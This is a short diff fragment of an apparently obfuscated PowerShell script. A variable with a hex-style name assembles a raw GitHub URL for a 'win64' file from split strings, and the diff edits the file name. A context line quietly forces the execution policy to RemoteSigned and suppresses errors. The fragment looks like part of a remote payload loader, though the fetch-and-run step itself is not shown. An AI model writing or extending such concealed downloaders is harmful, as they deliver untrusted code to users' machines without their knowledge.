@@ -6,7 +6,7 @@ $_0x91A = @(
 ".com/CONNERZZZ",
 "/aaa1/refs",
 "/heads/main/",
-"winx64"
+"win64"
 ) -join ""
 
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
